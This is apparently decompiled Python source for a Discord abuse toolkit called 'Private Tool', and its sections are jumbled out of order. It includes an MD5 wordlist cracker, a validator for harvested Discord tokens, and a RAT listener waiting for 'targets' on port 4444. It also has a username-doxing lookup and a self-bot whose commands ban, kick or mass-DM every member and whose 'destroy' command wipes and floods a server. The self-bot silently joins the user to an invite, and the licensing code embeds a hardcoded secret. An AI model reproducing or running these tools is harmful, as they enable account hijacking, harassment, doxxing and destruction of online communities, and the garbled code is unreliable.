    pass_hash = input('Enter your MD5 hash: ')
    print('The WorldList needs to be on the same directory than private.exe')
    print('Example for wordlist Name [yourwordlist.txt]')
    wordlist = input('Your Wordlist: ')
    try:
        pass_file = open(wordlist, 'r')
    except:
        print('No file found')
        os.close()

    for word in pass_file:
        enc_wrd = word.encode('utf-8')
        digest = hashlib.md5(enc_wrd.strip()).hexdigest()
        if digest == pass_hash:
            print(Fore.GREEN + '[+] Password found = ' + Fore.LIGHTCYAN_EX + word)
            flag = 1
            break
        if flag == 0:
            print('[-] Password is not in the List')


def tokencheckertokentxt():
    if os.path.isfile('TokenCombo/tokens.txt'):
        TokenChecker()
    else:
        Createtokentxt()


def Createtokentxt():
    if not os.path.exists('TokenCombo'):
        os.makedirs('TokenCombo')
    with open('TokenCombo/tokens.txt', 'w') as (f):
        f.write('ADD HERE YOUR TOKENS!!!')
        print('tokens.txt is created! program will close.')
        time.sleep(5)
        os.close()


def TokenChecker():
    os.system('cls && title TokenChecker')
    print(Fore.LIGHTGREEN_EX + "P\n    \n    \n                                _______    _                    _____ _               _             \n                               |__   __|  | |                  / ____| |             | |            \n                                  | | ___ | | _____ _ __      | |    | |__   ___  ___| | _____ _ __ \n                                  | |/ _ \\| |/ / _ \\ '_ \\     | |    | '_ \\ / _ \\/ __| |/ / _ \\ '__|\n                                  | | (_) |   <  __/ | | |    | |____| | | |  __/ (__|   <  __/ |   \n                                  |_|\\___/|_|\\_\\___|_| |_|     \\_____|_| |_|\\___|\\___|_|\\_\\___|_|   \n                                                                       \n                                                                       \n")
    with open('TokenCombo/tokens.txt', 'r') as (f):
        tokens = f.readlines()
        for i in tokens:
            token = i.rstrip()
            api = requests.get('https://discordapp.com/api/v6/users/@me/library', headers={'authorization': token})
            if api.status_code == 200:
                print(Fore.LIGHTGREEN_EX)
                print(f"[+] {token}")
                with open('TokenCombo/validtokens.txt', 'a') as (d):
                    d.write(f"{token}\n")
            else:
                print(Fore.LIGHTRED_EX)
                print(f"[-] {token}")

    print('')
    print('')
    print('')
    print('')
    print('')




def ProxyChecker():
    os.system('cls && title ProxyChecker ')

    def menu():
        try:
            print(Fore.LIGHTCYAN_EX)
            msg = "\n                                ____                       ____ _               _             \n                               |  _ \\ _ __ _____  ___   _ / ___| |__   ___  ___| | _____ _ __ \n                               | |_) | '__/ _ \\ \\/ / | | | |   | '_ \\ / _ \\/ __| |/ / _ \\ '__|\n                               |  __/| | | (_) >  <| |_| | |___| | | |  __/ (__|   <  __/ |   \n                               |_|   |_|  \\___/_/\\_\\__, | \\____|_| |_|\\___|\\___|_|\\_\\___|_|   \n                                                    |___/                                     \n\n\n                "
            for l in msg:
                print(l, end='')

        except KeyboardInterrupt:
            sys.exit()

    menu()
    print('')
    proxies = input(Fore.LIGHTWHITE_EX + 'Proxy Name must be in the same Folder as private.exe:' + Fore.CYAN + ' ')
    try:
        proxy_file = open(proxies, 'r')
    except:
        print('No File found!')
        quit()
    else:
        print('')
        print('')
        print(Fore.YELLOW + 'The Checker is just for HTTP/HTTPS proxies, so please type [1] to start the checking!')
        answer = input(Fore.LIGHTBLUE_EX + '>' + Fore.LIGHTRED_EX + ' ')
        print('')
        print('')
        print('The Proxies will get safed in the directory of private.exe as a ValidHTTPProxies.txt')
        print('')
        print('')
        print(Fore.LIGHTRED_EX + '-------' + Fore.LIGHTWHITE_EX + 'CHECKING ' + Fore.LIGHTMAGENTA_EX + 'PROXIES' + Fore.LIGHTRED_EX + '-------')
        print('')

        def savehttp(proxy):
            file = open('ValidHTTPProxies.txt', 'a')
            file.write(proxy)
            file.close()

        timeout = 3
        url = 'https://httpbin.org/ip'

        def httpproxychecker(proxy):
            global bad
            global good
            s = requests.session()
            s.proxies = {'http':'http://' + proxy,
             'https':'https://' + proxy}
            try:
                rr = s.get(url, timeout=timeout)
                print(Fore.GREEN + ' [+] Good ' + proxy)
                savehttp(proxy)
                good += 1
            except:
                print(Fore.RED + ' [-] Bad ' + proxy)
                bad += 1

        if answer == '1':
            proxyFile = open(proxies, 'r')
            proxy = proxyFile.readlines()
            for line in proxy:
                httpproxychecker(line)

            proxyFile.close()
        else:
            print('please type it in the right way!')


def HttpProxies():
    os.system('cls')
    webbrowser.open_new_tab('http://privatescripter.epizy.com/assets/downloads/proxies/http.txt')


def Socks4Proxies():
    os.system('cls')
    webbrowser.open_new_tab('http://privatescripter.epizy.com/assets/downloads/proxies/socks4.txt')


def Socks5Proxies():
    os.system('cls')
    webbrowser.open_new_tab('http://privatescripter.epizy.com/assets/downloads/proxies/socks5.txt')


def ProxyScraper():
    os.system('cls && title ProxyScraper')
    print(Fore.LIGHTGREEN_EX)
    print('P    \n                              ██▓███   ██▀███   ▒█████  ▒██   ██▒ ██▓▓█████   ██████ \n                             ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░▓██▒▓█   ▀ ▒██    ▒ \n                             ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒░░  █   ░▒██▒▒███   ░ ▓██▄   \n                             ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒ ░██░▒▓█  ▄   ▒   ██▒\n                             ▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒░██░░▒████▒▒██████▒▒\n                             ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░░▓  ░░ ▒░ ░▒ ▒▓▒ ▒ ░\n                             ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░ ▒ ░ ░ ░  ░░ ░▒  ░ ░\n                             ░░         ░░   ░ ░ ░ ░ ▒   ░    ░   ▒ ░   ░   ░  ░  ░  \n                                         ░         ░ ░   ░    ░   ░     ░  ░      ░  \n                                                                                     \n\n    \n    ')
    printSlow('HTTP - SOCKS4 - SOCKS5 \n\n')
    answer = input(Fore.YELLOW + 'Choose one of the following ' + Fore.RED + 'Proxies: ')
    print(Fore.LIGHTGREEN_EX)
    if answer == 'HTTP':
        os.system('cls && title HttpProxyScraper')
        HttpProxies()
    else:
        if answer == 'SOCKS4':
            os.system('cls && title SOCKS4ProxyScraper')
            Socks4Proxies()
        else:
            if answer == 'SOCKS5':
                os.system('cls && title SOCKS5ProxyScraper')
                Socks5Proxies()


def Server():
    os.system('cls && title Server')

    def menu():
        try:
            print(Fore.LIGHTCYAN_EX)
            msg = 'P                     \n                               ██████ ▓█████  ██▀███   ██▒   █▓▓█████  ██▀███  \n                             ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒\n                             ░ ▓██▄   ▒███   ▓██ ░▄█ ▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒\n                               ▒   ██▒▒▓█  ▄ ▒██▀▀█▄    ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  \n                             ▒██████▒▒░▒████▒░██▓ ▒██▒   ▒▀█░  ░▒████▒░██▓ ▒██▒\n                             ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░\n                             ░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░\n                             ░  ░  ░     ░     ░░   ░      ░░     ░     ░░   ░ \n                                   ░     ░  ░   ░           ░     ░  ░   ░     \n                                                           ░   \n\n                   '
            for l in msg:
                print(l, end='')

        except KeyboardInterrupt:
            sys.exit()

    menu()
    s = socket.socket()
    host = socket.gethostbyname(socket.gethostname())
    port = 4444
    s.bind((host, port))
    printSlow(Fore.LIGHTGREEN_EX + '[+] Server is running\n\n')
    print(Fore.LIGHTYELLOW_EX + '                   [+] Waiting for any targets!\n')
    s.listen(1)
    conn, addr = s.accept()
    print()
    print(addr, ' target connected!\n\n')
    while True:
        command = str(input(Fore.LIGHTGREEN_EX + '§' + Fore.LIGHTBLACK_EX + ' '))
        print('')
        if command == 'help':
            print(Fore.LIGHTGREEN_EX + '[HELP MENU]')
            print('---------------------------------------')
            print('[view_cwd] => Show directory of the Rat')
            print('---------------------------------------')
        elif command == 'view_cwd':
            conn.send(command.encode())
            files = conn.recv(5000)
            files = files.decode()
            print('Output => ' + files)


def DoxTool():
    os.system('cls && title DoxTool')
    print(Fore.RED + 'P\n\n                             ▓█████▄  ▒█████  ▒██   ██▒▄▄▄█████▓ ▒█████   ▒█████   ██▓    \n                             ▒██▀ ██▌▒██▒  ██▒▒▒ █ █ ▒░▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    \n                             ░██   █▌▒██░  ██▒░░  █   ░▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    \n                             ░▓█▄   ▌▒██   ██░ ░ █ █ ▒ ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    \n                             ░▒████▓ ░ ████▓▒░▒██▒ ▒██▒  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒\n                              ▒▒▓  ▒ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░\n                              ░ ▒  ▒   ░ ▒ ▒░ ░░   ░▒ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░\n                              ░ ░  ░ ░ ░ ░ ▒   ░    ░    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   \n                                ░        ░ ░   ░    ░               ░ ░      ░ ░      ░  ░\n                              ░                                                           \n\n\n    ')
    URLS = [
     'https://instagram.com/',
     'https://twitter.com/',
     'https://www.facebook.com/',
     'https://www.youtube.com/',
     'https://www.reddit.com/user/',
     'https://www.pinterest.com/',
     'https://www.github.com/',
     'https://www.flickr.com/people/',
     'https://steamcommunity.com/id/',
     'https://soundcloud.com/',
     'https://disqus.com/',
     'https://about.me/',
     'https://imgur.com/user/',
     'https://flipboard.com/@',
     'https://slideshare.net/']
    name = input(Fore.LIGHTBLUE_EX + 'Username: ')
    print('')
    for i in URLS:
        try:
            s = urlopen(i + name)
            print(Fore.LIGHTWHITE_EX + '[' + Fore.GREEN + '+' + Fore.LIGHTWHITE_EX + '] ' + Fore.LIGHTGREEN_EX + str(i) + str(name))
        except:
            print(Fore.LIGHTWHITE_EX + '[' + Fore.RED + '-' + Fore.LIGHTWHITE_EX + '] ' + Fore.LIGHTRED_EX + str(i) + str(name))

    print('')
    print('')
    print('')
    print('')


def SelfBot():

    class SELFBOT:
        __version__ = 1.6

    with open('config.json') as (f):
        config = json.load(f)
    token = config.get('token')
    prefix = config.get('prefix')
    loop = asyncio.get_event_loop()

    def Clear():
        os.system('cls')

    Clear()

    def Init():
        if config.get('token') == 'token-here':
            Clear()
            print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your token in the config.json file" + Fore.RESET)
        else:
            token = config.get('token')
        try:
            Private.run(token, bot=False, reconnect=True)
            os.system(f"title (Private Selfbot) - Version {SELFBOT.__version__}")
        except discord.errors.LoginFailure:
            print(Fore.LIGHTRED_EX + 'Not Valid Token')
            os.system('pause')
            os.close()

    class Login(discord.Client):

        async def on_connect(self):
            guilds = len(self.guilds)
            users = len(self.users)
            print('')
            print(f"Connected to: [{self.user.name}]")
            print(f"Token: {self.http.token}")
            print(f"Guilds: {guilds}")
            print(f"Users: {users}")
            print('-------------------------------')
            await self.logout()

    def async_executor():

        def outer(func):

            @functools.wraps(func)
            def inner(*args, **kwargs):
                thing = (functools.partial)(func, *args, **kwargs)
                return loop.run_in_executor(None, thing)

            return inner

        return outer

    def RandString():
        return ''.join((random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32))))

    colorama.init()
    Private = discord.Client()
    Private = commands.Bot(description='Private SelfBot',
      command_prefix=prefix,
      self_bot=True)
    Private.remove_command('help')

    @tasks.loop(seconds=3)
    @Private.event
    async def on_message_edit(before, after):
        await Private.process_commands(after)

    @Private.event
    async def on_connect():
        Clear()
        print(f"P{Fore.LIGHTCYAN_EX}\n\n\n     ██▓███   ██▀███   ██▓ ██▒   █▓ ▄▄▄     ▄▄▄█████▓▓█████      ██████ ▓█████  ██▓      █████▒▄▄▄▄    ▒█████  ▄▄▄█████▓\n    ▓██░  ██▒▓██ ▒ ██▒▓██▒▓██░   █▒▒████▄   ▓  ██▒ ▓▒▓█   ▀    ▒██    ▒ ▓█   ▀ ▓██▒    ▓██   ▒▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒\n    ▓██░ ██▓▒▓██ ░▄█ ▒▒██▒ ▓██  █▒░▒██  ▀█▄ ▒ ▓██░ ▒░▒███      ░ ▓██▄   ▒███   ▒██░    ▒████ ░▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░\n    ▒██▄█▓▒ ▒▒██▀▀█▄  ░██░  ▒██ █░░░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄      ▒   ██▒▒▓█  ▄ ▒██░    ░▓█▒  ░▒██░█▀  ▒██   ██░░ ▓██▓ ░ \n    ▒██▒ ░  ░░██▓ ▒██▒░██░   ▒▀█░   ▓█   ▓██▒ ▒██▒ ░ ░▒████▒   ▒██████▒▒░▒████▒░██████▒░▒█░   ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ \n    ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░▓     ░ ▐░   ▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░▓  ░ ▒ ░   ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   \n    ░▒ ░       ░▒ ░ ▒░ ▒ ░   ░ ░░    ▒   ▒▒ ░   ░     ░ ░  ░   ░ ░▒  ░ ░ ░ ░  ░░ ░ ▒  ░ ░     ▒░▒   ░   ░ ▒ ▒░     ░    \n    ░░         ░░   ░  ▒ ░     ░░    ░   ▒    ░         ░      ░  ░  ░     ░     ░ ░    ░ ░    ░    ░ ░ ░ ░ ▒    ░      \n                ░      ░        ░        ░  ░           ░  ░         ░     ░  ░    ░  ░        ░          ░ ░           \n                               ░                                                                    ░                   \n\n                            |---------------------------------------------|\n                            |                PRIVATE v1.6                 |\n                            |---------------------------------------------|\n                            | $ {Fore.RED}Private {Fore.CYAN}{SELFBOT.__version__}                               |\n                            | § {Fore.BLUE}Logged in: {Private.user.name}#{Private.user.discriminator}           |\n                            | § {Fore.MAGENTA}Discord-ID: {Fore.LIGHTGREEN_EX}{Private.user.id}            |\n                            | § {Fore.CYAN}Enter the Commands with: {Fore.GREEN}{prefix}                |\n                            | § You have to Enter the commands in Discord |\n                            |---------------------------------------------|\n\n\n        " + Fore.RESET)
        ctypes.windll.kernel32.SetConsoleTitleW(f"[Private Selfbot v{SELFBOT.__version__}]")
        headers = {'Authorization':token,
         'Content-Type':'application/json',
         'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        r = requests.post('https://discordapp.com/api/v6/invite/BGu62Ha', headers=headers)
        if r.status_code == 200:
            return True
        return False

    @Private.command()
    async def help(ctx):
        await ctx.send("\n---------------------------|\nWelcome to help menu |\n---------------------------|        \n\n\n.help = Shows all commands\n.clear = clear all your messages\n.destroy = destroys a Server completly ;)(Admin Permission)\n.spam [how much times] [your message] = You can spam a message--> Example: .spam 10 TestingMessage10Times\n.banall = will ban all people on that Server(Admin Permission)\n.unbanall = unban all people on that Server(Admin Permission)\n.kickall = kicks all people of that Server(Admin Permission)\n.dmall [message] = It will dm all people\n.scanport = It scan's a port with Nmap.\n\n\n")

    @Private.command()
    async def clear(ctx):
        await ctx.message.delete()
        await ctx.send('ﾠﾠ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nﾠﾠ')

    @Private.command()
    async def banall(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                pass

    @Private.command(aliases=['portscan'])
    async def scanport(ctx, arg1):
        scanyuh = requests.get('https://api.hackertarget.com/nmap/?q=%s' % arg1)
        result = scanyuh.text.strip(' ( https://nmap.org/ )')
        await ctx.send(f"`{result}`")

    @Private.command()
    async def unbanall(ctx):
        await ctx.message.delete()
        banlist = await ctx.guild.bans()
        for users in banlist:
            try:
                await asyncio.sleep(2)
                await ctx.guild.unban(user=(users.user))
            except:
                pass

    @Private.command()
    async def spam(ctx, amount: int, *, message):
        await ctx.message.delete()
        for _i in range(amount):
            await ctx.send(message)

    @Private.command()
    async def kickall(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.kick()
            except:
                pass

    @Private.command()
    async def dmall(ctx, *, message):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await asyncio.sleep(5)
                await user.send(message)
            except:
                pass

    @Private.command()
    async def destroy(ctx):
        await ctx.message.delete()
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                pass

        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                pass

        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except:
                pass

        try:
            await ctx.guild.edit(name=(RandString()),
              description='I dont really know ;3',
              icon=None,
              banner=None)
        except:
            pass
        else:
            for _i in range(250):
                await ctx.guild.create_text_channel(name=(RandString()))

            for _i in range(250):
                await ctx.guild.create_role(name=(RandString()))

    if __name__ == '__main__':
        Init()


def ControlDCBot():
    print(Fore.LIGHTGREEN_EX + 'Enter the Webhook of the discord Bot!')
    botwebhook = input('> ')
    hook = Webhook(botwebhook)
    while True:
        messages = input('Enter a message: ')
        hook.send(messages)


def ColorChanger():
    os.system('cls && title Choose-Color')
    print("Choose one of the following Color's for the Menu design!")
    print('')
    print('')
    print(Fore.BLUE + 'BLUE  ' + Fore.LIGHTBLUE_EX + '     LIGHTBLUE')
    print(Fore.RED + 'RED  ' + Fore.LIGHTRED_EX + '      LIGHTRED')
    print(Fore.GREEN + 'GREEN  ' + Fore.LIGHTGREEN_EX + '    LIGHTGREEN')
    print(Fore.YELLOW + 'YELLOW  ' + Fore.LIGHTYELLOW_EX + '   LIGHTYELLOW')
    print(Fore.WHITE + 'WHITE  ' + Fore.LIGHTWHITE_EX + '    LIGHTWHITE')
    print(Fore.MAGENTA + 'MAGENTA  ' + Fore.LIGHTMAGENTA_EX + '  LIGHTMAGENTA')
    print(Fore.CYAN + 'CYAN  ' + Fore.LIGHTCYAN_EX + '     LIGHTCYAN')
    print(Fore.LIGHTBLACK_EX + '           LIGHTBLACK')
    print('')
    print('')
    color = input('> ')
    c = {'color': color}
    with open('colorsettings.json', 'w', encoding='utf8') as (json_file):
        json.dump(c, json_file, ensure_ascii=True)


Design()
Modules()

def ResetTool():
    os.system('pause')
    os.system('cls && title Private Tool')
    getapi()
    Design()
    Modules()


while True:
    ResetTool()

        clear = lambda : os.system('cls')
        try:
            with open(sys.argv[0], 'rb') as (f):
                while True:
                    data = f.read(BUF_SIZE)
                    if not data:
                        break
                    md5.update(data)

        except:
            messagebox.showerror('Auth.GG | Licensing System', 'Hash Calculating Failed')
            os._exit(0)
        else:
            filehash = md5.hexdigest()
            login_status = 0
            register_status = 0
            apikey = 'UPDATE_ME'
            secret = 'hPZUgko7rAqBCCvlqQQvI8BDkL8ghV3UesK'
            aid = '259755'
            version = '1.0'
            random = 'your random code here'

            def main():
                clear()
                print("\n                                             _   _      _____           _                 \n                                  /\\        | | | |    / ____|         | |                \n                                 /  \\  _   _| |_| |__ | (___  _   _ ___| |_ ___ _ __ ___  \n                                / /\\ \\| | | | __| '_ \\ \\___ \\| | | / __| __/ _ \\ '_ ` _ \\ \n                               / ____ \\ |_| | |_| | | |____) | |_| \\__ \\ ||  __/ | | | | |\n                              /_/    \\_\\__,_|\\__|_| |_|_____/ \\__, |___/\\__\\___|_| |_| |_|\n                                                               __/ |                      \n                                                              |___/                       \n\n            ")
                os.system('title Auth Menu')
                print('[1] Login')
                print('[2] Register')
                print('[3] Redeem (extend subscription)')
                option = input('\n> ')
                if option == '1':
                    login()
                else:
                    if option == '2':
                        register()
                    else:
                        if option == '3':
                            redeem()
                        else:
                            print('\n[!] Invalid Option')
                            time.sleep(2)
                            main()

            def integrity_check():
                headers = {'User-Agent': 'AuthGG'}
                data = {'type':'start', 
                 'random':random, 
                 'secret':secret, 
                 'aid':aid, 
                 'apikey':apikey}

            def login():
                if login_status == 0:
                    os.system('cls')
                    os.system('title Login Menu')
                    username = input('[?] Enter Username: ')
                    password = input('[?] Enter Password: ')
                    data = {'type':'login', 
                     'aid':aid, 
                     'random':random, 
                     'apikey':apikey, 
                     'secret':secret, 
                     'username':username, 
                     'password':password, 
                     'hwid':hwid}
                    headers = {'User-Agent': 'AuthGG'}
                    try:
                        with requests.Session() as (sess):
                            sess.trust_env = False
                            request_2 = sess.post('https://api.auth.gg/version2/api.php', verify=False, headers=headers, data=data)
                            response_2 = request_2.text
                            flag2 = response_2 == request_2.text
                            if flag2:
                                if 'success' in response_2:
                                    print('\n[!] Welcome back, {}!'.format(username))
                                    time.sleep(2)
                                else:
                                    if 'invalid_details' in response_2:
                                        print('\n[!] Wrong username/password')
                                    else:
                                        if 'invalid_hwid' in response_2:
                                            print('\n[!] Invalid HWID, please do not attempt to share accounts!')
                                        else:
                                            if 'hwid_updated' in response_2:
                                                print('\n[!] Your HWID has been updated, relogin!')
                                            else:
                                                if 'time_expired' in response_2:
                                                    print('\n[!] Your subscription has expired!')
                                                else:
                                                    if 'net_error' in response_2:
                                                        print('\n[!] Something went wrong!')
                                                    else:
                                                        print('\n[!] Something went wrong!')
                                    time.sleep(2)
                                    os._exit(0)
                            else:
                                os._exit(0)
                    except:
                        messagebox.showerror('Auth.GG Licensing System', 'Something went wrong!')
                        os._exit(0)

                else:
                    messagebox.showerror('Auth.GG Licensing System', 'Login is not available at this time!')
                    os._exit(0)

            def register():
                os.system('cls')
                os.system('title Register Menu')
                if register_status == 0:
                    token = input('[?] Please enter token: ')
                    email = input('[?] Please enter email: ')
                    username = input('[?] Please enter username: ')
                    password = input('[?] Please enter password: ')
                    headers = {'User-Agent': 'AuthGG'}
                    data = {'type':'register', 
                     'aid':aid, 
                     'random':random, 
                     'apikey':apikey, 
                     'secret':secret, 
                     'username':username, 
                     'password':password, 
                     'email':email, 
                     'token':token, 
                     'hwid':hwid}
                    try:
                        with requests.Session() as (sess):
                            sess.trust_env = False
                            request_3 = sess.post('https://api.auth.gg/version2/api.php', verify=False, data=data, headers=headers)
                            response_3 = request_3.text
                            flag3 = response_3 == request_3.text
                            if flag3:
                                if 'success' in response_3:
                                    print('\n[!] {}, you have successfully registered!'.format(username))
                                    time.sleep(2)
                                    os._exit(0)
                                else:
                                    if 'invalid_token' in response_3:
                                        print('\n[!] Token invalid or already used')
                                    else:
                                        if 'invalid_username' in response_3:
                                            print('\n[!] Username already taken, please choose another one')
                                        else:
                                            if 'email_used' in response_3:
                                                print('\n[!] Email is invalid or in use!')
                                            else:
                                                print('\n[!] Something went wrong!')
                                    time.sleep(2)
                                    os._exit(0)
                            else:
                                os._exit(0)
                    except:
                        messagebox.showerror('Auth.GG Licensing System', 'Something went wrong!')
                        os._exit(0)

                else:
                    messagebox.showerror('Auth.GG Licensing System', 'Register is not available at this time!')
                    os._exit(0)

            def redeem():
                os.system('cls')
                os.system('title Redeem Menu')
                username = input('[?] Enter Username: ')
                password = input('[?] Enter Password: ')
                token = input('[?] Please enter token: ')
                headers = {'User-Agent': 'AuthGG'}
                data = {'type':'redeem', 
                 'aid':aid, 
                 'random':random, 
                 'apikey':apikey, 
                 'secret':secret, 
                 'username':username, 
                 'password':password, 
                 'token':token}
                try:
                    with requests.Session() as (sess):
                        sess.trust_env = False
                        request_4 = sess.post('https://api.auth.gg/version2/api.php', verify=False, data=data, headers=headers)
                        response_4 = request_4.text
                        flag4 = response_4 == request_4.text
                        if flag4:
                            if 'success' in response_4:
                                print('\n[!] Successfully redeemed license & extended subscription!')
                            else:
                                if 'invalid_token' in response_4:
                                    print('\n[!] Invalid Credentials!')
                                else:
                                    if 'net_error' in response_4:
                                        print('\n[!] Something went wrong!')
                            time.sleep(2)
                            os._exit(0)
                        else:
                            os._exit(0)
                except:
                    messagebox.showerror('Auth.GG Licensing System', 'Something went wrong!')
                    os._exit(0)

            integrity_check()
            main()



def printSlow(text):
    for char in text:
        print(char, end='')
        sys.stdout.flush()
        time.sleep(0.05)


def check():
    if os.path.isfile('colorsettings.json'):
        getapi()
    else:
        Color()


def getapi():
    with open('colorsettings.json') as (f):
        config = json.load(f)
    color = config.get('color')
    if config.get('color') == 'RED':
        nicecolor = Fore.RED
    else:
        if config.get('color') == 'BLUE':
            nicecolor = Fore.BLUE
        else:
            if config.get('color') == 'GREEN':
                nicecolor = Fore.GREEN
            else:
                if config.get('color') == 'YELLOW':
                    nicecolor = Fore.YELLOW
                else:
                    if config.get('color') == 'MAGENTA':
                        nicecolor = Fore.MAGENTA
                    else:
                        if config.get('color') == 'CYAN':
                            nicecolor = Fore.CYAN
                        else:
                            if config.get('color') == 'WHITE':
                                nicecolor = Fore.WHITE
                            else:
                                if config.get('color') == 'LIGHTRED':
                                    nicecolor = Fore.LIGHTRED_EX
                                else:
                                    if config.get('color') == 'LIGHTBLUE':
                                        nicecolor = Fore.LIGHTBLUE_EX
                                    else:
                                        if config.get('color') == 'LIGHTGREEN':
                                            nicecolor = Fore.LIGHTGREEN_EX
                                        else:
                                            if config.get('color') == 'LIGHTYELLOW':
                                                nicecolor = Fore.LIGHTYELLOW_EX
                                            else:
                                                if config.get('color') == 'LIGHTMAGENTA':
                                                    nicecolor = Fore.LIGHTMAGENTA_EX
                                                else:
                                                    if config.get('color') == 'LIGHTCYAN':
                                                        nicecolor = Fore.LIGHTCYAN_EX
                                                    else:
                                                        if config.get('color') == 'LIGHTWHITE':
                                                            nicecolor = Fore.LIGHTWHITE_EX
                                                        else:
                                                            if config.get('color') == 'LIGHTBLACK':
                                                                nicecolor = Fore.LIGHTBLACK_EX
                                                            os.system('cls')
                                                            print(nicecolor)


def Color():
    os.system('cls && title Choose-Color')
    print("Choose one of the following Color's for the Menu design!")
    print('')
    print('')
    print(Fore.BLUE + 'BLUE  ' + Fore.LIGHTBLUE_EX + '     LIGHTBLUE')
    print(Fore.RED + 'RED  ' + Fore.LIGHTRED_EX + '      LIGHTRED')
    print(Fore.GREEN + 'GREEN  ' + Fore.LIGHTGREEN_EX + '    LIGHTGREEN')
    print(Fore.YELLOW + 'YELLOW  ' + Fore.LIGHTYELLOW_EX + '   LIGHTYELLOW')
    print(Fore.WHITE + 'WHITE  ' + Fore.LIGHTWHITE_EX + '    LIGHTWHITE')
    print(Fore.MAGENTA + 'MAGENTA  ' + Fore.LIGHTMAGENTA_EX + '  LIGHTMAGENTA')
    print(Fore.CYAN + 'CYAN  ' + Fore.LIGHTCYAN_EX + '     LIGHTCYAN')
    print(Fore.LIGHTBLACK_EX + '           LIGHTBLACK')
    print('')
    print('')
    color = input('> ')
    c = {'color': color}
    with open('colorsettings.json', 'w', encoding='utf8') as (json_file):
        json.dump(c, json_file, ensure_ascii=True)
    os.close()


check()

def Design():
    os.system('title Private Tool')
